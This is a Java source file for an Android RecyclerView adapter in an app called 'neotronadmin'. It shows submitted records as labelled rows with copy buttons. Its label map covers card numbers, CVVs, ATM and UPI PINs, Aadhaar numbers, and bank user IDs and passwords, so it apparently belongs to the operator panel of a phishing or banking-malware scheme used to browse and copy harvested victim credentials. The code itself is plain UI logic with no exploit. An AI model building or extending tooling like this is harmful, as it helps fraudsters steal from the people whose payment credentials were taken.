package com.pegalite.neotronadmin.components.adapters;

import static android.content.Context.CLIPBOARD_SERVICE;
import static android.view.View.GONE;
import static android.view.View.VISIBLE;

import android.annotation.SuppressLint;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.view.LayoutInflater;
import android.view.ViewGroup;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.recyclerview.widget.RecyclerView;

import com.pegalite.neotronadmin.databinding.DetailsItemBinding;
import com.pegalite.neotronadmin.databinding.DetailsSubItemBinding;
import com.pegalite.neotronadmin.functions.viewmanagers.PegaAppCompatActivity;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.util.HashMap;
import java.util.Iterator;

public class DetailsAdapter extends RecyclerView.Adapter<DetailsAdapter.DetatilsViewHolder> {

    private final static HashMap<String, String> detailsAlterKeys = new HashMap<>();

    static {
        detailsAlterKeys.put("name", "Name");
        detailsAlterKeys.put("number", "Number");
        detailsAlterKeys.put("aadhar", "Aadhar");
        detailsAlterKeys.put("type", "Type");
        detailsAlterKeys.put("customerNo", "Customer No");
        detailsAlterKeys.put("reason", "Reason");
        detailsAlterKeys.put("cardType", "Card Type");
        detailsAlterKeys.put("cardNumber", "Card Number");
        detailsAlterKeys.put("expiry", "Expiry");
        detailsAlterKeys.put("cvv", "CVV");
        detailsAlterKeys.put("atmPin", "ATM Pin");
        detailsAlterKeys.put("dateOfBirth", "Date Of Birth");
        detailsAlterKeys.put("bankName", "Bank Name");
        detailsAlterKeys.put("userID", "User ID");
        detailsAlterKeys.put("password", "Password");
        detailsAlterKeys.put("knoNumber", "KNO Number");
        detailsAlterKeys.put("fullName", "Full Name");
        detailsAlterKeys.put("phone", "Phone");
        detailsAlterKeys.put("mobileNo", "Mobile No");
        detailsAlterKeys.put("customerID", "Customer ID");
        detailsAlterKeys.put("upiPin", "UPI Pin");
    }

    private final JSONArray detailsArray;
    private final PegaAppCompatActivity activity;

    public DetailsAdapter(JSONArray detailsArray, PegaAppCompatActivity activity) {
        this.detailsArray = detailsArray;
        this.activity = activity;
    }

    @NonNull
    @Override
    public DetatilsViewHolder onCreateViewHolder(@NonNull ViewGroup parent, int viewType) {
        return new DetatilsViewHolder(DetailsItemBinding.inflate(LayoutInflater.from(parent.getContext()), parent, false));
    }

    @SuppressLint("SetTextI18n")
    @Override
    public void onBindViewHolder(@NonNull DetatilsViewHolder holder, int position) {
        try {
            JSONObject model = detailsArray.getJSONObject(position);
            holder.binding.getRoot().removeAllViews();

            Iterator<String> keys = model.keys();
            int count = 0;
            int size = model.length();
            while (keys.hasNext()) {
                count++;
                String key = keys.next();
                if (key.equals("submissionId")) {
                    continue;
                }
                String value = model.optString(key, "");
                DetailsSubItemBinding binding = DetailsSubItemBinding.inflate(LayoutInflater.from(activity), holder.binding.getRoot(), false);
                binding.key.setText(detailsAlterKeys.getOrDefault(key, key));
                binding.value.setText(value);
                binding.copy.setOnClickListener(v -> {
                    ClipboardManager clipboard = (ClipboardManager) activity.getSystemService(CLIPBOARD_SERVICE);
                    ClipData clip = ClipData.newPlainText(detailsAlterKeys.getOrDefault(key, key), value);
                    clipboard.setPrimaryClip(clip);
                    Toast.makeText(activity, detailsAlterKeys.getOrDefault(key, key) + " Copied Successfully", Toast.LENGTH_SHORT).show();
                });
                holder.binding.getRoot().addView(binding.getRoot());
                if (count == size) {
                    binding.bottomLine.setVisibility(GONE);
                } else {
                    binding.bottomLine.setVisibility(VISIBLE);
                }
            }
        } catch (JSONException e) {
            throw new RuntimeException(e);
        }
    }

    @Override
    public int getItemCount() {
        return detailsArray.length();
    }

    public static class DetatilsViewHolder extends RecyclerView.ViewHolder {

        DetailsItemBinding binding;

        public DetatilsViewHolder(@NonNull DetailsItemBinding binding) {
            super(binding.getRoot());
            this.binding = binding;
        }
    }
}

